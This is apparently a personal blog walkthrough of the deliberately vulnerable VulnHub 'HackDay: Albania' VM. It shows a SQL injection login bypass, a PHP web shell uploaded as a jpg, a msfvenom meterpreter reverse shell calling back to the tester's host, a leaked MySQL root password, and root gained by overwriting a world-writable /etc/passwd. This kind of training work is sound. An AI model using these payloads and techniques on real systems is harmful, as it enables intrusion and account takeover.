+++
Description = "Vulnhub - HackDay: Albania Writeup"
title = "Vulnhub - HackDay: Albania Writeup"
date = "2016-11-24T18:45:00+01:00"
metakeys = ["vulnhub", "walkthrough", "writeup", "hackday albania"]
image = "/img/misc/vulnhub.png"
+++

I was bored today so I thought it would be a good chance to try any of the current [VulnHub](https://www.vulnhub.com/) VMs.
I decided to try the latest [HackDay: Albania](https://www.vulnhub.com/entry/hackday-albania,167/) from [@R-73eN](https://twitter.com/r_73en).

<!--more-->

At first I imported the VM into VirtualBox, did a quick `netdiscover` in kali to get the IP address and fired up `nmap`:

```
root@kali:~# nmap -sS -T4 -A -p- 192.168.56.101

Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-24 10:12 CET
Nmap scan report for 192.168.56.101
Host is up (0.00030s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  2048 39:76:a2:f0:82:5f:1f:75:0d:e4:c4:c5:a7:48:b1:58 (RSA)
8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 26 disallowed entries (15 shown)
| /rkfpuzrahngvat/ /slgqvasbiohwbu/ /tmhrwbtcjpixcv/
| /vojtydvelrkzex/ /wpkuzewfmslafy/ /xqlvafxgntmbgz/ /yrmwbgyhouncha/
| /zsnxchzipvodib/ /atoydiajqwpejc/ /bupzejbkrxqfkd/ /cvqafkclsyrgle/
|_/unisxcudkqjydw/ /dwrbgldmtzshmf/ /exschmenuating/ /fytdinfovbujoh/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HackDay Albania 2016
MAC Address: 08:00:27:98:0D:5F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.30 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.54 seconds
```

So there is only an open SSH port and one apache running on port 8008.

The Startpage only presents some albanian text wich translates to (at least according to Google Translate):
```
Welcome
If I am, I know where to go;)
OK ok, but not here :)
```

[![Startpage](/img/vulnhub_hackday_albania/startpage_thumb.png)](/img/vulnhub_hackday_albania/startpage.png)

Nmap said the `robots.txt` on this host has 26 entries so lets have a look at those:
```
root@kali:~# curl -s http://192.168.56.101:8008/robots.txt
Disallow: /rkfpuzrahngvat/
Disallow: /slgqvasbiohwbu/
Disallow: /tmhrwbtcjpixcv/
Disallow: /vojtydvelrkzex/
Disallow: /wpkuzewfmslafy/
Disallow: /xqlvafxgntmbgz/
Disallow: /yrmwbgyhouncha/
Disallow: /zsnxchzipvodib/
Disallow: /atoydiajqwpejc/
Disallow: /bupzejbkrxqfkd/
Disallow: /cvqafkclsyrgle/
Disallow: /unisxcudkqjydw/
Disallow: /dwrbgldmtzshmf/
Disallow: /exschmenuating/
Disallow: /fytdinfovbujoh/
Disallow: /gzuejogpwcvkpi/
Disallow: /havfkphqxdwlqj/
Disallow: /ibwglqiryexmrk/
Disallow: /jcxhmrjszfynsl/
Disallow: /kdyinsktagzotm/
Disallow: /lezjotlubhapun/
Disallow: /mfakpumvcibqvo/
Disallow: /ngblqvnwdjcrwp/
Disallow: /ohcmrwoxekdsxq/
Disallow: /pidnsxpyfletyr/
Disallow: /qjeotyqzgmfuzs/
```

Opening the first 3 URLs by hand we see that every URL contains a HTML page with the same meme.

![Meme](/img/vulnhub_hackday_albania/robots_meme.png)

So I wrote a quick and dirty script to get the memes from all directories to take a closer look:

```
for x in $(curl -s http://192.168.56.101:8008/robots.txt | sed -e "s/Disallow: //" | sed -e "s/\///g"); \
  do wget -O $x.bin -o $x.log http://192.168.56.101:8008/$x/background.jpg; done
```

Checking out the downloaded files I quickly noted that there is one meme missing:
```
root@kali:~/albania# file *.bin
atoydiajqwpejc.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
bupzejbkrxqfkd.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
cvqafkclsyrgle.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
dwrbgldmtzshmf.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
exschmenuating.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
fytdinfovbujoh.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
gzuejogpwcvkpi.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
havfkphqxdwlqj.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
ibwglqiryexmrk.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
jcxhmrjszfynsl.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
kdyinsktagzotm.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
lezjotlubhapun.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
mfakpumvcibqvo.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
ngblqvnwdjcrwp.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
ohcmrwoxekdsxq.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
pidnsxpyfletyr.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
qjeotyqzgmfuzs.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
rkfpuzrahngvat.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
slgqvasbiohwbu.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
tmhrwbtcjpixcv.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
unisxcudkqjydw.bin: empty
vojtydvelrkzex.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
wpkuzewfmslafy.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
xqlvafxgntmbgz.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
yrmwbgyhouncha.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
zsnxchzipvodib.bin: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 500x500, frames 3
```

Checking the corresponding logfile shows that the image could not be found in folder `unisxcudkqjydw`.
```
root@kali:~/albania# cat unisxcudkqjydw.log
--2016-11-24 10:19:45--  http://192.168.56.101:8008/unisxcudkqjydw/background.jpg
Connecting to 192.168.56.101:8008... connected.
HTTP request sent, awaiting response... 404 Not Found
2016-11-24 10:19:45 ERROR 404: Not Found.
```

So lets call this folder in the browser to see, why this error happened. This directory is the only one with no meme in it, but a little hint:
```
IS there any /vulnbank/ in there ???
```

So after calling
```
http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/
```

We are presented a login page for Secure Bank.

[![Login](/img/vulnhub_hackday_albania/login_thumb.png)](/img/vulnhub_hackday_albania/login.png)

I first tried to log in with various default passwort combinations but none of them worked.

After putting a single `'` in the username field, the application responds with an PHP error message:
```
Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/unisxcudkqjydw/vulnbank/client/config.php on line 102
```

**BOOM** looks like SQL-Injection. As I'm lazy I fired up SQLMAP to do the job for me:
```
sqlmap -u "http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/login.php" --data "username=&password=" --dbms mysql --level 5 --risk 3
```

Unfortunately SQLMAP was only able to verify the SQL-Injection but not exploit it - so I had to do it manually.

Sending the request to Burp Intruder I tried the SQL Injection Fuzzing Payloads and it looks like the application is filtering some SQL keywords like "AND" and "OR".

Assuming the query looks something like this
```php
select junk from users where username='$_GET["username"]' and password='$_GET["password"]';
```

a simple query like
```
username'; --
```

should bypass the check (note the extra space at the end).

If the query works, the following SQL statement should be executed and the password check is commented out:
```SQL
select junk from users where username='username'; -- ' and password='';
```

I tried to use users like user and admin in the query but none of them worked so I fired up Burp Intruder again to do some username enumeration.

Inserting the SQL-Injection payload as username und marking the missing username as injection point Burp was able to identify a user named `jeff`.

[![Login](/img/vulnhub_hackday_albania/user_enumeration_thumb.png)](/img/vulnhub_hackday_albania/user_enumeration.png)

So the final payload to bypass the login is

```
jeff'; --
```

which results in the query
```SQL
select junk from users where username='jeff';
```

We are greeted with a ticket system with the ability to upload files. I first tried to upload a simple PHP shell but the application responds with an error message saying only graphic files with certain extensions are allowed. Trying to simply change the `Content-Type` header does not work so I decided to upload a normal image to see how the application behaves.
After uploading we can call the ticket details and check out the image url.
The image is included with the following URL which renders the image as text so this could be a simple PHP include vulnerability.
```
http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=image.jpg
```

![pwned](/img/vulnhub_hackday_albania/image_as_text.png)

So I just renamed my shell.php to shell.jpg and tried the upload again. After viewing the image in the ticket with
```
http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&cmd=id
```
we are able to execute commands as the www-data user.
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

shell.php content:
```PHP
<?php echo shell_exec($_GET['cmd']); ?>
```

To make things easier I created a meterpreter binary with a jpg extension and uploaded it with a new ticket:

```
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o meterpreter.jpg LHOST=192.168.56.102 LPORT=1337
```

After making the binary executable with
```
http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&cmd=chmod%20%2bx%20./upload/meterpreter.jpg
```

we can verify it's now executable
```
http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&cmd=ls%20-alh%20./upload/meterpreter.jpg
```

```
-rwxr-xr-x 1 www-data www-data 155 Nov 24 17:13 ./upload/meterpreter.jpg
```

Next step is to fire up a meterpreter listener and execute the binary via the web shell.

```
msfconsole -qx 'use multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.56.102; set LPORT 1337; set ExitOnSession false; run -j; jobs -v'
```

```
http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&cmd=./upload/meterpreter.jpg
```

```
msf exploit(handler) >
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.102:1337 -> 192.168.56.101:54486) at 2016-11-24 17:18:05 +0100
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : hackday
OS           : Linux hackday 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 (x86_64)
Architecture : x86_64
Meterpreter  : x86/linux
meterpreter > getuid
Server username: uid=33, gid=33, euid=33, egid=33, suid=33, sgid=33
```

We can now take a closer look at the SQL-Injection filtering and after looking at the files we can see whats going on in `config.php`:

```php
function check_login($username,$password){
  $username = str_ireplace("OR", "", $username);
  $username = str_ireplace("UNION", "", $username);
  $username = str_ireplace("AND", "", $username);
  $password = str_ireplace("'","",$password);
  $sql_query = "SELECT ID FROM klienti where `username` = '$username' and `password` = '$password';";
  $result = mysqli_fetch_assoc(execute_query($sql_query));
  $result = $result["ID"];
  if($result >= 1){
    return $result;
  }else{
    return -1;
  }
}
```

Before executing the query the `OR`, `UNION` and `AND` keywords are removed and also the `'` is stripped from the password parameter.

Now let's search for a privilege escalation on the server to get ourselves root. By looking at `/etc/passwd` we can see there is a user with a login shell called `taviso`.

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
taviso:x:1000:1000:Taviso,,,:/home/taviso:/bin/bash
```

Looking at the groups taviso is able to execute sudo so this might be a good start:
```
$ grep taviso /etc/group
adm:x:4:syslog,taviso
cdrom:x:24:taviso
sudo:x:27:taviso
dip:x:30:taviso
plugdev:x:46:taviso
lxd:x:110:taviso
taviso:x:1000:
lpadmin:x:117:taviso
sambashare:x:118:taviso
```

Looking for a way to become the user taviso I noticed the webapp is using the mysql root user to connect to the database.

```php
$db_host = "127.0.0.1";
$db_name = "bank_database";
$db_user = "root";
$db_password = "NuCiGoGo321";
```

Trying to login:

```
mysql -u root -pNuCiGoGo321
```

Sadly there was no other content in the database and I did not want to try the latest mysql server race condition privescs because I thought that's lame and there has to be another way. But hey, at least we now have the valid logins for all users:

```
mysql> select * from klienti;
select * from klienti;
+----+-------------+---------+---------+----------+------------+
| ID | emer        | mbiemer | bilanci | username | password   |
+----+-------------+---------+---------+----------+------------+
|  1 | Charles D.  | Hobson  |   25000 | hobson   | Charles123 |
|  2 | Jeffery     | Fischer |  120000 | jeff     | jeff321    |
+----+-------------+---------+---------+----------+------------+
2 rows in set (0.00 sec)
```

Searching the system for world writeable files gave me a little **WTF** moment:
**/etc/passwd is writeable by every user**

```
$ find / -type f -perm -o+w -exec ls -l {} \; 2>/dev/null | grep -v /proc/ | grep -v /sys/
-rw-r--rw- 1 root root 1623 Oct 22 17:21 /etc/passwd
-rwxrwxrwx 1 root root 0 Oct 22 16:56 /var/crash/.lock
```

So I downloaded the `/etc/passwd` with meterpreter and generated a new password hash with python:
```
root@kali:~# python -c 'import crypt; print crypt.crypt("supersecretpassword", "$6$saltsalt$")'
$6$saltsalt$t084OTPu49EJVUgFTLQxZ4yArFIeFzEnpGtrpyifSoSmJuIk0rQ9YmVXUyd2.Is1eMV/S0loZUxni1ijH5Qem.
```

I then replaced the second field of the user root and taviso in the passwd file with the new password hash and uploaded it again, overwriting the original `/etc/passwd`.

Trying to SSH in with root and the new password failed - likely because root SSH login is disabled.
But trying to SSH in with the user taviso works and we now have a working session!

Knowing the user taviso is able to execute sudo, let's check his rights:

```
taviso@hackday:~$ sudo -l
[sudo] password for taviso:
Matching Defaults entries for taviso on hackday:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User taviso may run the following commands on hackday:
    (ALL : ALL) ALL

taviso@hackday:~$ su -
Password:
root@hackday:~#
```

BOOM that escalated quickly.

![pwned](/img/vulnhub_hackday_albania/escalated_quickly.jpg)

Now we are able to get the flag from the root directory:

```
root@hackday:~# cat flag.txt
Urime,
Tani nis raportin!

d5ed38fdbf28bc4e58be142cf5a17cf5
```

`d5ed38fdbf28bc4e58be142cf5a17cf5` is the MD5 hash of the string `rio`.

The original password hash of `taviso` extracted from `/etc/shadow`:
```
taviso:$6$RpYQyuNB$yYNQbBo6ICCb0pwNKBMVeQeA/NZwrYPxy4WnXs2NybNeGAh3XrmkJ94cuqA1.CYc0e07R.QbQEIdXLIL5U83T1:17096:0:99999:7:::
```

Thanks [@R-73eN](https://twitter.com/r_73en) for this VM!
